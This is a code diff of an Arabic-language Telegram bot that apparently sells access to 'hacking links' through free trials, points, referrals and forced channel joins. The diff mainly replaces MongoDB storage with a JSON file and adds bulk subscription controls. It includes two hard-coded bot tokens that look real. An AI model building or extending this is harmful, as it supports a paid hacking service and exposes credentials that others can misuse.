@@ -6,8 +6,7 @@ const fs = require('fs');
 const path = require('path');
 const useragent = require('useragent');
 const TinyURL = require('tinyurl');
-const { connectToMongoDB, saveData, loadData, closeConnection } = require('./database');
-const botToken = '7252078284:AAFt6ySoKDAJx-6wbg435qnU-_ramrgRL8Y';
+const botToken = '7235293038:AAG9RdOV0AXcXxn32wY62njSc6wbPayjOvA';
 const bot = new TelegramBot(botToken, { polling: true });
 
 const app = express();
@@ -20,16 +19,11 @@ const storage = multer.memoryStorage();
 const upload = multer({ storage: storage });
 
 
-const userVisits = {};
 const MAX_FREE_ATTEMPTS = 5;
-const platformVisits = {};
-const activatedUsers = new Set();
 let pointsRequiredForSubscription = 15;
 const freeTrialEndedMessage = "انتهت فترة التجربة المجانيه لان تستطيع استخدام اي رابط اختراق حتى تقوم بل الاشتراك من المطور او قوم بجمع نقاط لاستمرار في استخدام البوت";
 
 const forcedChannelUsernames = ['@SJGDDW', '@YEMENCYBER101', '@YYY_A12'];
-
-let userPoints, userReferrals, subscribedUsers, bannedUsers, allUsers, usedReferralLinks
 
 // دالة للتحقق من المسؤول
 const adminId = '7130416076';
@@ -45,9 +39,11 @@ function addPointsToUser(userId, points) {
   const user = allUsers.get(userId);
   user.points = (user.points || 0) + points;
   userPoints.set(userId, user.points);
+  checkSubscriptionStatus(userId);
+  saveData(); // حفظ البيانات بعد إضافة النقاط
   return user.points;
 }
-// دالة لخصم نقاط من مستخدم معين
+
 function deductPointsFromUser(userId, points) {
   if (!allUsers.has(userId)) {
     return false;
@@ -56,6 +52,7 @@ function deductPointsFromUser(userId, points) {
   if ((user.points || 0) >= points) {
     user.points -= points;
     userPoints.set(userId, user.points);
+    saveData(); // حفظ البيانات بعد خصم النقاط
     return true;
   }
   return false;
@@ -198,27 +195,49 @@ bot.on('callback_query', async (callbackQuery) => {
     case 'subscribe':
       bot.sendMessage(chatId, 'أدخل معرف المستخدم الذي تريد إضافته للمشتركين:');
       bot.once('message', async (response) => {
-        const userId = response.text;
-        if (subscribedUsers.has(userId)) {
-          bot.sendMessage(chatId, `المستخدم ${userId} موجود بالفعل في قائمة المشتركين.`);
+        const userIdToSubscribe = response.text;
+        if (subscribeUser(userIdToSubscribe)) {
+          bot.sendMessage(chatId, `تم اشتراك المستخدم ${userIdToSubscribe} بنجاح.`);
         } else {
-          subscribedUsers.add(userId);
-          bot.sendMessage(chatId, `تمت إضافة المستخدم ${userId} إلى قائمة المشتركين بنجاح.`);
-          bot.sendMessage(userId, 'تم اشتراكك بنجاح! يمكنك استخدام البوت بدون قيود.');
+          bot.sendMessage(chatId, `المستخدم ${userIdToSubscribe} مشترك بالفعل.`);
         }
       });
       break;
+
     case 'unsubscribe':
-      bot.sendMessage(chatId, 'أدخل معرف المستخدم الذي تريد إزالته من المشتركين:');
+      bot.sendMessage(chatId, 'أدخل معرف المستخدم الذي تريد إلغاء اشتراكه:');
       bot.once('message', async (response) => {
-        const userId = response.text;
-        if (subscribedUsers.delete(userId)) {
-          bot.sendMessage(chatId, `تمت إزالة المستخدم ${userId} من قائمة المشتركين.`);
-          bot.sendMessage(userId, 'تم إلغاء اشتراكك. قد تواجه بعض القيود على استخدام البوت.');
+        const userIdToUnsubscribe = response.text;
+        if (unsubscribeUser(userIdToUnsubscribe)) {
+          bot.sendMessage(chatId, `تم إلغاء اشتراك المستخدم ${userIdToUnsubscribe} بنجاح.`);
         } else {
-          bot.sendMessage(chatId, `المستخدم ${userId} غير موجود في قائمة المشتركين.`);
+          bot.sendMessage(chatId, `المستخدم ${userIdToUnsubscribe} غير مشترك أصلاً.`);
         }
       });
+      break;
+
+    case 'subscribe_all':
+      let subscribedCount = 0;
+      for (const [userId, user] of allUsers) {
+        if (!subscribedUsers.has(userId)) {
+          subscribedUsers.add(userId);
+          subscribedCount++;
+          try {
+            await bot.sendMessage(userId, 'تم تفعيل اشتراكك في البوت. يمكنك الآن استخدام جميع الميزات.');
+          } catch (error) {
+            console.error(`فشل في إرسال رسالة للمستخدم ${userId}:`, error);
+          }
+        }
+      }
+      await bot.sendMessage(chatId, `تم إضافة اشتراك لـ ${subscribedCount} مستخدم جديد.`);
+      saveData(); // حفظ البيانات بعد اشتراك الجميع
+      break;
+
+    case 'unsubscribe_all':
+      const unsubscribedCount = subscribedUsers.size;
+      subscribedUsers.clear();
+      await bot.sendMessage(chatId, `تم إلغاء اشتراك جميع المستخدمين. تم إلغاء اشتراك ${unsubscribedCount} مستخدم.`);
+      saveData(); // حفظ البيانات بعد إلغاء اشتراك الجميع
       break;
     case 'listsubscribers':
       const subscribersList = Array.from(subscribedUsers).join('\n');
@@ -401,27 +420,71 @@ bot.on('callback_query', (query) => {
 });
 
 
-// مثال على كيفية إرسال أزرار قائمة 
+// مثال على كيفية إرسال أزرار قائمة الإحصائيات
 
 
+function saveData() {
+  const data = {
+    userVisits,
+    platformVisits,
+    allUsers: Array.from(allUsers),
+    activatedUsers: Array.from(activatedUsers),
+    bannedUsers: Array.from(bannedUsers),
+    subscribedUsers: Array.from(subscribedUsers),
+    userPoints: Array.from(userPoints),
+    userReferrals: Array.from(userReferrals),
+    usedReferralLinks: Array.from(usedReferralLinks),
+    pointsRequiredForSubscription
+  };
+  fs.writeFileSync('botData.json', JSON.stringify(data));
+  console.log('تم حفظ البيانات بنجاح');
+}
 
-// تعريف المتغيرات العامة
+function loadData() {
+  if (fs.existsSync('botData.json')) {
+    const data = JSON.parse(fs.readFileSync('botData.json'));
+    userVisits = data.userVisits;
+    platformVisits = data.platformVisits;
+    allUsers = new Map(data.allUsers);
+    activatedUsers = new Set(data.activatedUsers);
+    bannedUsers = new Map(data.bannedUsers);
+    subscribedUsers = new Set(data.subscribedUsers);
+    userPoints = new Map(data.userPoints);
+    userReferrals = new Map(data.userReferrals);
+    usedReferralLinks = new Map(data.usedReferralLinks);
+    pointsRequiredForSubscription = data.pointsRequiredForSubscription;
+    console.log('تم تحميل البيانات بنجاح');
+  } else {
+    console.log('لم يتم العثور على ملف البيانات، سيتم البدء بقيم افتراضية');
+  }
+}
 
-// ... (باقي الكود الخاص بالبوت)
-
-// مثال على استخدام الدوال الجديدة
+loadData();
 
 
-  // ... (باقي منطق معالجة الرسائل)
+function subscribeUser(userId) {
+  if (!subscribedUsers.has(userId)) {
+    subscribedUsers.add(userId);
+    bot.sendMessage(userId, 'تم اشتراكك بنجاح! يمكنك الآن استخدام جميع ميزات البوت.');
+    saveData(); // حفظ البيانات بعد الاشتراك
+    return true;
+  }
+  return false;
+}
 
-
-// ... (باقي الكود الخاص بالبوت)
-
-// بدء تشغيل البوت
-
+function unsubscribeUser(userId) {
+  if (subscribedUsers.has(userId)) {
+    subscribedUsers.delete(userId);
+    bot.sendMessage(userId, 'تم إلغاء اشتراكك. قد تواجه بعض القيود على استخدام البوت.');
+    saveData(); // حفظ البيانات بعد إلغاء الاشتراك
+    return true;
+  }
+  return false;
+}
 
   // هنا يمكنك إضافة المزيد من المنطق لمعالجة الرسائل العادية
-
+// حفظ البيانات كل 5 دقائق
+setInterval(saveData, 5 * 60 * 1000);
 
   // باقي الكود لمعالجة الرسائل
  
@@ -458,6 +521,11 @@ function deductPointsFromUser(userId, points) {
   return false;
 }
 // تشغيل البوت
+bot.on('polling_error', (error) => {
+  console.log(error);
+});
+
+console.log('البوت يعمل الآن...');
 
 const trackAttempts = (userId, action) => {
     if (!userVisits[userId]) {
@@ -721,7 +789,7 @@ const crypto = require('crypto');
 // إنشاء رابط الدعوة
 function createReferralLink(userId) {
   const referralCode = Buffer.from(userId).toString('hex');
-  return `https://t.me/Hzhzhxhbxbdbot?start=${referralCode}`;
+  return `https://t.me/submitLocationbot?start=${referralCode}`;
 }
 
 // فك تشفير رمز الدعوة
@@ -750,44 +818,16 @@ async function checkSubscription(userId) {
         }
       } catch (error) {
         console.error('خطأ أثناء التحقق من عضوية القناة:', error);
+        
         return false;
       }
     }
+    return true;
   }
   return true;
 }
 
-// تهيئة البوت
-async function initializeBot() {
-  try {
-    await connectToMongoDB();
-    
-    userPoints = await loadData('userPoints') || new Map();
-    userReferrals = await loadData('userReferrals') || new Map();
-    subscribedUsers = new Set(await loadData('subscribedUsers') || []);
-    bannedUsers = new Set(await loadData('bannedUsers') || []);
-    allUsers = await loadData('allUsers') || new Map();
-    usedReferralLinks = await loadData('usedReferralLinks') || new Map();
-
-    console.log('تم تحميل البيانات بنجاح');
-
-    // حفظ البيانات كل دقيقة
-    setInterval(async () => {
-      await saveData('userPoints', userPoints);
-      await saveData('userReferrals', userReferrals);
-      await saveData('subscribedUsers', Array.from(subscribedUsers));
-      await saveData('bannedUsers', Array.from(bannedUsers));
-      await saveData('allUsers', allUsers);
-      await saveData('usedReferralLinks', usedReferralLinks);
-    }, 60000);
-
-  } catch (error) {
-    console.error('خطأ أثناء تهيئة البوت:', error);
-    process.exit(1);
-  }
-}
-
-// معالجة الرسائل
+// التعامل مع الرسائل
 bot.on('message', async (msg) => {
   const chatId = msg.chat.id;
   const text = msg.text ? msg.text.toLowerCase() : '';
@@ -800,8 +840,8 @@ bot.on('message', async (msg) => {
       lastName: msg.from.last_name || '',
       username: msg.from.username || ''
     };
-    
     allUsers.set(chatId.toString(), newUser);
+    saveData(); 
     await bot.sendMessage(adminId, `مستخدم جديد دخل البوت:\nالاسم: ${newUser.firstName} ${newUser.lastName}\nاسم المستخدم: @${newUser.username}\nمعرف الدردشة: ${chatId}`);
   }
 
@@ -810,6 +850,7 @@ bot.on('message', async (msg) => {
     return;
   }
 
+  // التحقق من الاشتراك عند كل رسالة /start
   if (text.startsWith('/start')) {
     const isSubscribed = await checkSubscription(senderId);
     if (!isSubscribed) {
@@ -817,7 +858,6 @@ bot.on('message', async (msg) => {
     }
   }
 
-  // معالجة الأوامر
   if (text === '/start') {
     showDefaultButtons(senderId);
   } else if (text === '/login') {
@@ -825,101 +865,91 @@ bot.on('message', async (msg) => {
   } else if (text === '/hacking') {
     showHackingButtons(senderId);
   } else if (text.startsWith('/start ')) {
-    handleReferralLink(msg);
+    const startPayload = text.split(' ')[1];
+    console.log('Start payload:', startPayload);
+
+    if (startPayload) {
+      const referrerId = decodeReferralCode(startPayload);
+      console.log('Decoded referrer ID:', referrerId);
+      console.log('Sender ID:', senderId);
+
+      if (referrerId && referrerId !== senderId) {
+        try {
+          const usedLinks = usedReferralLinks.get(senderId) || new Set();
+          if (!usedLinks.has(referrerId)) {
+            usedLinks.add(referrerId);
+            usedReferralLinks.set(senderId, usedLinks);
+
+            const referrerPoints = addPointsToUser(referrerId, 1);
+
+            await bot.sendMessage(referrerId, `قام المستخدم ${msg.from.first_name} بالدخول عبر رابط الدعوة الخاص بك. أصبح لديك ${referrerPoints} نقطة.`);
+            await bot.sendMessage(senderId, 'مرحبًا بك! لقد انضممت عبر رابط دعوة وتمت إضافة نقطة للمستخدم الذي دعاك.');
+
+            console.log(`User ${senderId} joined using referral link from ${referrerId}`);
+          } else {
+            await bot.sendMessage(senderId, 'لقد استخدمت هذا الرابط من قبل.');
+          }
+        } catch (error) {
+          console.error('خطأ في معالجة رابط الدعوة:', error);
+          await bot.sendMessage(senderId, 'حدث خطأ أثناء معالجة رابط الدعوة. الرجاء المحاولة مرة أخرى.');
+        }
+      } else {
+        await bot.sendMessage(senderId, 'رابط الدعوة غير صالح أو أنك تحاول استخدام رابط الدعوة الخاص بك.');
+      }
+    } else {
+      await bot.sendMessage(senderId, 'مرحبًا بك في البوت!');
+    }
+
+    showDefaultButtons(senderId);
   }
 });
 
-// معالجة الاستعلامات
+// التعامل مع الاستفسارات
 bot.on('callback_query', async (callbackQuery) => {
   const chatId = callbackQuery.message.chat.id;
   const userId = callbackQuery.from.id.toString();
   const data = callbackQuery.data;
 
   try {
+    // التحقق من الاشتراك قبل تنفيذ أي عملية
     const isSubscribed = await checkSubscription(userId);
     if (!isSubscribed) {
       return;
     }
 
-    switch (data) {
-      case 'create_referral':
-        handleCreateReferral(chatId, userId);
-        break;
-      case 'my_points':
-        handleMyPoints(chatId, userId);
-        break;
-      // أضف المزيد من الحالات هنا
-      default:
-        handleDefaultCallback(chatId, userId, data);
+   if (data === 'create_referral') {
+    const referralLink = createReferralLink(userId);
+    console.log('Created referral link:', referralLink);
+    await bot.sendMessage(chatId, `رابط الدعوة الخاص بك هو:\n${referralLink}`);
+    saveData(); // حفظ البيانات بعد إنشاء رابط دعوة
+  } else if (data === 'my_points') {
+    const points = userPoints.get(userId) || 0;
+    const isSubscribed = subscribedUsers.has(userId);
+    let message = isSubscribed
+      ? `لديك حاليًا ${points} نقطة. أنت مشترك في البوت ويمكنك استخدامه بدون قيود.`
+      : `لديك حاليًا ${points} نقطة. اجمع ${pointsRequiredForSubscription} نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
+    await bot.sendMessage(chatId, message);
+  } else {
+      if (!subscribedUsers.has(userId)) {
+        const attempts = trackAttempt(userId, data);
+        if (attempts > MAX_FREE_ATTEMPTS) {
+          await bot.sendMessage(chatId, 'لقد تجاوزت الحد الأقصى للمحاولات المجانية. يرجى الاشتراك أو جمع المزيد من النقاط لاستخدام هذه الميزة.');
+        } else {
+          await bot.sendMessage(chatId, `ملاحظة: يمكنك استخدام هذه الميزة ${MAX_FREE_ATTEMPTS - attempts + 1} مرات أخرى قبل الحاجة إلى الاشتراك أو جمع المزيد من النقاط.`);
+          // هنا يمكنك إضافة الكود الخاص بكل عملية
+        }
+      } else {
+        await bot.sendMessage(chatId, 'جاري تنفيذ العملية...');
+        // هنا يمكنك إضافة الكود الخاص بكل عملية
+      }
     }
   } catch (error) {
     console.error('Error in callback query handler:', error);
     await bot.sendMessage(chatId, 'حدث خطأ أثناء تنفيذ العملية. الرجاء المحاولة مرة أخرى لاحقًا.');
   }
 
+  saveData(); // حفظ البيانات بعد كل عملية
   await bot.answerCallbackQuery(callbackQuery.id);
-});
-
-// دوال معالجة الاستعلامات
-async function handleCreateReferral(chatId, userId) {
-  const referralLink = createReferralLink(userId);
-  console.log('Created referral link:', referralLink);
-  await bot.sendMessage(chatId, `رابط الدعوة الخاص بك هو:\n${referralLink}`);
-}
-
-async function handleMyPoints(chatId, userId) {
-  const points = userPoints.get(userId) || 0;
-  const isSubscribed = subscribedUsers.has(userId);
-  let message = isSubscribed
-    ? `لديك حاليًا ${points} نقطة. أنت مشترك في البوت ويمكنك استخدامه بدون قيود.`
-    : `لديك حاليًا ${points} نقطة. اجمع ${pointsRequiredForSubscription} نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
-  await bot.sendMessage(chatId, message);
-}
-
-async function handleDefaultCallback(chatId, userId, data) {
-  if (!subscribedUsers.has(userId)) {
-    const attempts = trackAttempt(userId, data);
-    if (attempts > MAX_FREE_ATTEMPTS) {
-      await bot.sendMessage(chatId, 'لقد تجاوزت الحد الأقصى للمحاولات المجانية. يرجى الاشتراك أو جمع المزيد من النقاط لاستخدام هذه الميزة.');
-    } else {
-      await bot.sendMessage(chatId, `ملاحظة: يمكنك استخدام هذه الميزة ${MAX_FREE_ATTEMPTS - attempts + 1} مرات أخرى قبل الحاجة إلى الاشتراك أو جمع المزيد من النقاط.`);
-      // هنا يمكنك إضافة الكود الخاص بكل عملية
-    }
-  } else {
-    await bot.sendMessage(chatId, 'جاري تنفيذ العملية...');
-    // هنا يمكنك إضافة الكود الخاص بكل عملية
-  }
-}
-
-// تشغيل البوت
-initializeBot().then(() => {
-  console.log('البوت جاهز للعمل');
-}).catch(error => {
-  console.error('فشل في بدء تشغيل البوت:', error);
-});
-
-
-
-// معالجة إنهاء البرنامج
-process.on('SIGINT', async () => {
-  console.log('تم استلام إشارة إنهاء البرنامج. جاري حفظ البيانات...');
-  try {
-    await saveData('userPoints', userPoints);
-    await saveData('userReferrals', userReferrals);
-    await saveData('subscribedUsers', Array.from(subscribedUsers));
-    await saveData('bannedUsers', Array.from(bannedUsers));
-    await saveData('allUsers', allUsers);
-    await saveData('usedReferralLinks', usedReferralLinks);
-    await closeConnection();
-    console.log('تم حفظ البيانات وإغلاق الاتصال بنجاح');
-    process.exit(0);
-  } catch (error) {
-    console.error('حدث خطأ أثناء إغلاق البرنامج:', error);
-    process.exit(1);
-  }
-});
-
-
 
 
 function addPointsToUser(userId, points) {
@@ -930,6 +960,7 @@ function addPointsToUser(userId, points) {
   user.points = (user.points || 0) + points;
   userPoints.set(userId, user.points);
   checkSubscriptionStatus(userId);
+  saveData(); // حفظ البيانات بعد إضافة النقاط
   return user.points;
 }
 
@@ -938,6 +969,7 @@ function deductPointsFromUser(userId, points) {
   if (currentPoints >= points) {
     const newPoints = currentPoints - points;
     userPoints.set(userId, newPoints);
+    saveData(); // حفظ البيانات بعد خصم النقاط
     return true;
   }
   return false;
@@ -961,7 +993,7 @@ function addPointsToUser(userId, points) {
 function checkSubscriptionStatus(userId) {
   const user = allUsers.get(userId);
   if (!user) return false;
-  
+
   if (user.points >= pointsRequiredForSubscription) {
     if (!subscribedUsers.has(userId)) {
       // خصم النقاط المطلوبة للاشتراك
@@ -970,17 +1002,18 @@ function checkSubscriptionStatus(userId) {
       
       subscribedUsers.add(userId);
       bot.sendMessage(userId, `تهانينا! لقد تم اشتراكك تلقائيًا. تم خصم ${pointsRequiredForSubscription} نقطة من رصيدك.`);
+      saveData(); // حفظ البيانات بعد الاشتراك
     }
     return true;
   } else {
     if (subscribedUsers.has(userId)) {
       subscribedUsers.delete(userId);
       bot.sendMessage(userId, 'تم إلغاء اشتراكك بسبب نقص النقاط. يرجى جمع المزيد من النقاط للاشتراك مرة أخرى.');
+      saveData(); // حفظ البيانات بعد إلغاء الاشتراك
     }
     return false;
   }
 }
-
 function trackAttempt(userId, feature) {
   if (!userVisits[userId]) userVisits[userId] = {};
   userVisits[userId][feature] = (userVisits[userId][feature] || 0) + 1;
